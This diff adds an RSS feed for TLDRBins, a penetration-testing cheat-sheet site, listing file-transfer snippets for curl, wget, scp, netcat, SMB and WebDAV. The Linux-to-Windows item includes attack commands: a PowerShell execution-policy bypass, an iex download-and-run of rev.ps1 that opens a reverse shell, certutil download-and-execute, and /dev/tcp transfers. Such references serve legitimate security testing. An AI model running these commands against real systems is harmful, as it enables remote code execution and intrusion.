@@ -1,0 +1,67 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Http File Transfer on TLDRBins</title>
+    <link>https://tldrbins.github.io/@http-file-transfer/</link>
+    <description>Recent content in Http File Transfer on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@http-file-transfer/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Advance curl</title>
+      <link>https://tldrbins.github.io/advance_curl/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/advance_curl/</guid>
+      <description>Advance curl # POST url-encoded data curl --data-urlencode &amp;#39;&amp;lt;QUERY_STRING&amp;gt;&amp;#39; &amp;lt;TARGET&amp;gt; # Put the POST data to url and use GET curl -G --data-urlencode &amp;#39;&amp;lt;QUERY_STRING&amp;gt;&amp;#39; &amp;lt;TARGET&amp;gt; # PUT a file curl -X PUT &amp;lt;TARGET&amp;gt;/&amp;lt;FILE&amp;gt; -d @&amp;lt;FILE&amp;gt; # PUT a file (with creds) curl -X PUT -u &amp;#39;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; &amp;lt;TARGET&amp;gt;/&amp;lt;FILE&amp;gt; -d @&amp;lt;FILE&amp;gt; # Put a file as raw binary format (preserve newlines and control characters) curl -X PUT &amp;lt;TARGET&amp;gt;/&amp;lt;FILE&amp;gt; --data-binary @&amp;lt;FILE&amp;gt; # POST a file with form param &amp;#39;file&amp;#39; curl -X POST -F &amp;#39;file=@&amp;lt;FILE&amp;gt;;type=&amp;lt;APPLICATION_TYPE&amp;gt;;filename=&amp;lt;FILE&amp;gt;&amp;#39; &amp;lt;TARGET&amp;gt; # POST a file in raw-text format (not as attachment) with form param &amp;#39;file&amp;#39; curl -X POST -F &amp;#39;file=&amp;lt;&amp;lt;FILE&amp;gt;&amp;#39; &amp;lt;TARGET&amp;gt; # Not to handle sequences of &amp;#39;/.</description>
+    </item>
+    <item>
+      <title>Advance wget</title>
+      <link>https://tldrbins.github.io/advance_wget/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/advance_wget/</guid>
+      <description>Advance wget # Provide a file with urls wget --input-file &amp;lt;FILE_PATH&amp;gt; # POST a file wget --post-file &amp;lt;FILE_PATH&amp;gt; &amp;lt;TARGET&amp;gt; # Overwrite a file wget &amp;lt;TARGET&amp;gt;/&amp;lt;FILE&amp;gt; -O &amp;lt;FILE_PATH&amp;gt; </description>
+    </item>
+    <item>
+      <title>Connection from Public Internet</title>
+      <link>https://tldrbins.github.io/connection_from_public_internet/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/connection_from_public_internet/</guid>
+      <description>Simply catch HTTP request webhook.site&#xA;Catch HTTP request and host a web server serveo.net ngrok # Start a local HTTP server python3 -m http.server &amp;lt;LOCAL_PORT&amp;gt; # Redirect http request to localhost:&amp;lt;LOCAL_PORT&amp;gt; ssh -R 80:localhost:&amp;lt;LOCAL_PORT&amp;gt; serveo.net ngrok http 80 Ref: ngrok Note: ngrok free will show a warning message and require user accpet to proceed Note: Not good for XSS</description>
+    </item>
+    <item>
+      <title>File Transfer (Linux To Linux)</title>
+      <link>https://tldrbins.github.io/file_transfer_linux_to_linux/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/file_transfer_linux_to_linux/</guid>
+      <description>HTTP nc scp PIPE Base64 # Start a local HTTP server python3 -m http.server &amp;lt;LOCAL_PORT&amp;gt; # In target Linux machine wget &amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/&amp;lt;FILE&amp;gt; # In target Linux machine curl &amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/&amp;lt;FILE&amp;gt; -o &amp;lt;REMOTE_DEST_PATH&amp;gt; # In our local Linux machine nc -lvnp &amp;lt;LOCAL_PORT&amp;gt; &amp;lt; &amp;lt;FILE&amp;gt; # In target Linux machine nc -w3 &amp;lt;LOCAL_IP&amp;gt; &amp;lt;LOCAL_PORT&amp;gt; &amp;gt; &amp;lt;FILE&amp;gt; Remote to Local # With password scp &amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt;:&amp;lt;REMOTE_FILE_PATH&amp;gt; &amp;lt;LOCAL_DEST_PATH&amp;gt; # With id_rsa scp -i id_rsa &amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt;:&amp;lt;REMOTE_FILE_PATH&amp;gt; &amp;lt;LOCAL_DEST_PATH&amp;gt; Local to Remote # With password scp &amp;lt;LOCAL_FILE_PATH&amp;gt; &amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt;:&amp;lt;REMOTE_DEST_PATH&amp;gt; # With id_rsa scp -i id_rsa &amp;lt;LOCAL_FILE_PATH&amp;gt; &amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt;:&amp;lt;REMOTE_DEST_PATH&amp;gt; Local to Remote # In our local Linux machine cat &amp;lt;FILE&amp;gt; | nc -lnvp &amp;lt;LOCAL_PORT&amp;gt; # In target Linux machine exec 3&amp;lt;&amp;gt;/dev/tcp/&amp;lt;LOCAL_IP&amp;gt;/&amp;lt;LOCAL_PORT&amp;gt; # Ctrl+C to interrupt after some time cat &amp;lt;&amp;amp;3 &amp;gt; &amp;lt;FILE&amp;gt; # Check md5sum &amp;lt;FILE&amp;gt; Small binary # Base64 encode binary cat &amp;lt;FILE&amp;gt; | base64 -w0 # Copy and paste the base64 encoded binary echo -n &amp;#39;&amp;lt;BASE64_FILE&amp;gt;&amp;#39; | base64 -d &amp;gt; &amp;lt;FILE&amp;gt; Note: For restricted environment</description>
+    </item>
+    <item>
+      <title>File Transfer (Linux to Windows)</title>
+      <link>https://tldrbins.github.io/file_transfer_linux_to_windows/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/file_transfer_linux_to_windows/</guid>
+      <description> Powershell cmd evil-winrm Start a Local HTTP Server python3 -m http.server &amp;lt;LOCAL_PORT&amp;gt; # Invoke-WebRequest iwr http://&amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/&amp;lt;FILE&amp;gt; -o C:\ProgramData\&amp;lt;FILE&amp;gt; Note: PowerShell 3.0+&#xA;# Curl powershell -ep bypass curl &amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/&amp;lt;FILE&amp;gt; -o C:\ProgramData\&amp;lt;FILE&amp;gt; Note: curl is not always available&#xA;# Load into memory and Run # Invoke-Expression iex (New-Object Net.WebClient).DownloadString(&amp;#39;http://&amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/rev.ps1&amp;#39;);Invoke-PowerShellTcp -Reverse -IPAddress &amp;lt;LOCAL_IP&amp;gt; -Port &amp;lt;LOCAL_PORT&amp;gt; # Short version iex (iwr http://&amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/rev.ps1) Ref: rev.ps1&#xA;Start a Local HTTP Server python3 -m http.server &amp;lt;LOCAL_PORT&amp;gt; certutil -urlcache -split -f http://&amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/&amp;lt;FILE&amp;gt; C:\ProgramData\&amp;lt;FILE&amp;gt; # Upload and Run certutil -urlcache -split -f http://&amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/&amp;lt;FILE&amp;gt; C:\ProgramData\&amp;lt;FILE&amp;gt; &amp;amp;&amp;amp; C:\ProgramData\&amp;lt;FILE&amp;gt; # Evil-winrm built-in function upload &amp;#39;&amp;lt;LOCAL_FILE_PATH&amp;gt;&amp;#39; &amp;#34;C:\ProgramData\&amp;lt;FILE&amp;gt;&amp;#34; </description>
+    </item>
+    <item>
+      <title>File Transfer (Windows To Linux)</title>
+      <link>https://tldrbins.github.io/file_transfer_windows_to_linux/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/file_transfer_windows_to_linux/</guid>
+      <description>SMB Base64 evil-winrm Start a Local SMB Server impacket-smbserver share . -smb2support cmd # Connect to SMB server without creds net use \\&amp;lt;LOCAL_IP&amp;gt;\share # Connect to SMB server with creds net use \\&amp;lt;LOCAL_IP&amp;gt;\share /u:&amp;lt;USER&amp;gt; &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; # From target Windows to local Linux copy &amp;lt;FILE&amp;gt; \\&amp;lt;LOCAL_IP&amp;gt;\share # From local Linux to target Windows copy \\&amp;lt;LOCAL_IP&amp;gt;\share\&amp;lt;FILE&amp;gt; &amp;lt;FILE&amp;gt; # Delete file del &amp;lt;FILE&amp;gt; # Remove SMB share net use /d \\&amp;lt;LOCAL_IP&amp;gt;\share # Older Windows (e.</description>
+    </item>
+    <item>
+      <title>Webdav</title>
+      <link>https://tldrbins.github.io/webdav/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/webdav/</guid>
+      <description>Tools davtest curl # Without creds davtest -url http://&amp;lt;TARGET&amp;gt; # With creds davtest -url http://&amp;lt;TARGET&amp;gt; -auth &amp;#39;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; Ref: Download davtest&#xA;# Rename a remote file curl -X MOVE -H &amp;#39;Destination:http://&amp;lt;TARGET&amp;gt;/&amp;lt;NEW_FILENAME&amp;gt;&amp;#39; http://&amp;lt;TARGET&amp;gt;/&amp;lt;FILE&amp;gt; </description>
+    </item>
+    <item>
+      <title>Winrm from Windows VM</title>
+      <link>https://tldrbins.github.io/winrm_from_windows_vm/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/winrm_from_windows_vm/</guid>
+      <description>Preparation 0. Check Systeminfo # Windows Pro is needed systeminfo 1. Connect to VPN OpenVPN client&#xA;2. Add DNS Server +-----------------------------------------------------------------------------------+ | 1. Go to &amp;#39;Control Panel\Network and Internet\Network and Sharing Center&amp;#39; | | 2. Click &amp;#39;Local Area Connection&amp;#39; | | 3. Go to &amp;#39;Properties&amp;#39; -&amp;gt; &amp;#39;Internet Protocol Version 4 (TCP/IPv4)&amp;#39; -&amp;gt; &amp;#39;Properties&amp;#39; | | 4. Under &amp;#39;General&amp;#39;, check &amp;#39;Obtain an IP address automatically&amp;#39; | | 5. Check &amp;#39;Use the following DNS address&amp;#39; -&amp;gt; &amp;#39;Prefer DNS Server&amp;#39; -&amp;gt; &amp;lt;DC_IP&amp;gt; | +-----------------------------------------------------------------------------------+ 3.</description>
+    </item>
+  </channel>
+</rss>
